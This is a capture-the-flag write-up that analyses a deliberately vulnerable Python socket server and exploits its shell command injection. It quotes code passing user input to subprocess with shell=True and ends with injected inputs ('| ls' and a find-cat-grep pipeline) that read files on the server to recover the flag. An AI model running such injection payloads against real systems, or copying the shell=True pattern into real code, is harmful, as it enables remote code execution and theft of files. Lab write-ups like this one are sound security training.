# Loab's House of Horrors Vol.I
> It sounds like Loab is back and luring students into their trap. Thankfully Anna managed to rip the source code before Loab left the NJIT network. If we can find the flag we might be able to shut this down!

This time, the task is to reverse and exploit a Python script. Connecting to the server leads to a simple conversation, where you have to state your name. Looking at the code, this is the relevant function, that handles that:

```py
def handle_client(conn, addr):
    print("Handling client:", addr)
    shuffle_it()
    conn.send(monologue())
    conn.send(b"Who dares enter my realm: ")
    name = conn.recv(1024)
    if not name:
        print("Client disconnected before talking.")
        conn.close()
        cleanup(None, None)
    name = name.decode().strip()
    try:
        output = subprocess.check_output(
            f"echo {name} ",
            shell=True,
            stderr=subprocess.STDOUT,
        )
        output = twisted(output)
        conn.send(b"\n\tGet comfortable. You will be here forever.\n")
        conn.send(output)
    except subprocess.CalledProcessError as e:
        conn.send(b"\nYou are not worth my time.\n")
        conn.close()
        conn.shutdown(socket.SHUT_RDWR)
        return

    converse(conn)
    print("Connection closed with client:", addr)
    cleanup(None, None)
```

What's striking at first is the subprocess routine that calls `echo {name}`. Let's dig deeper.

```py
def shuffle_it():
    location = random.randint(0, 8)
    locswild = location + 1
    # You remember frankie muniz from Deuces Wild?
    locswild = rb.b64encode(locswild)
    # What a movie that was.
    where = locations[str(location)]
    # I'm not sure if I'm supposed to be moving the flag or the goalposts
    possible_locations = ["/home/victim/flag.txt"] + list(locations.values())
    flag_found = False

    for loc in possible_locations:
        if os.path.exists(loc):
            try:
                # Run things in the background because we actually have a lot of stuff to do
                subprocess.run(["mv", loc, where], check=True)
                flag_found = True
                break
            except Exception as e:
                # Obviously we need to gracefully handle things
                print(f"Failed to move flag from {loc} to {where}: {e}")
        else:
            # This won't get called. I'm sure of it. I worked hard.
            print(f"Flag not found at {loc}")
    if not flag_found:
        print("Flag not found in any location")
    return flag_found
```

The `shuffle_it` function copies the flag from `/home/victim/flag.txt` to one of the locations specified in the `locations` dict. This actually took me some time to figure out, because I thought those locations were directories and an example final location would look like this: `/tmp/orphans/flag.txt`. Turned out that in this case the `orphans` would hold the flag.

```py
def twisted(content):
    a = rb.b64encode(content)
    b = rb.b64encode(content)
    x = rb.b64encode(b)
    c = rb.b64encode(b)
    c = rb.b64encode(content)
    e = rb.b64encode(content)
    d = rb.b64encode(content)
    return b
```

The `twisted` function takes a value returned by the subprocess routine and prints it in base64. 

Last interesting function is `converse`:

```py
def converse(conn):
    try:
        taunt_number = random.randint(0, 15)
        conn.send(b"\n\t")
        conn.send(taunt[str(taunt_number)].encode())
        conn.send(b"\n\tIs that it? Pitiful.")
        response = conn.recv(1024)
        if not response:
            print("Client disconnected during converse.")
            return
        response = response.decode().strip()
        if any(char in response for char in [";", "&", "|", "`", "$", ">", "<"]):
            with open("/tmp/injection_detected", "w") as f:
                f.write("1")
            conn.send(b"\nYou have triggered my trap! The end is near...\n")

        try:
            output = subprocess.check_output(
                f"echo Pitiful. {response}",
                shell=True,
                stderr=subprocess.STDOUT,
            )
            output = twisted(output)
            conn.send(output)
        except subprocess.CalledProcessError as e:
            conn.send(b"\n\tYou are not worth my time.\n")
            conn.send(b"\n\tConnection will be terminated.\n")
            conn.close()
            return

        conn.send(b"\n\tGoodbye.\n")
        conn.close()
        return

    except Exception as e:
        print(f"Error during converse: {e}")
    finally:
        conn.close()
        print("Connection closed during conversation.")
```

It does almost the same thing as `handle_client`, but additionally checks for special character in the user's reponse and writes `1` into `/tmp/injection_detected`.


Now we are ready to try some stuff out. I started with `| ls` as input:

```
d2F0Y2hkb2cucHkKd2VsY29tZS5weQo=
```

This returns all files on current server directory in base64, which means we have an RCE. The final exploit is as simple as printing all files from `/tmp` and `/home/victim` and grepping for a flag:

```sh
| find /home/victim /tmp -type f -exec cat {} \; | grep "NICC{"
```

This results in `TklDQ3tKdTV0X3B1N19sMEBiXzFuX3JjM19vcl9oMzExX2lfZ3Uzc3N9`, which can be translated into a flag.

`NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}`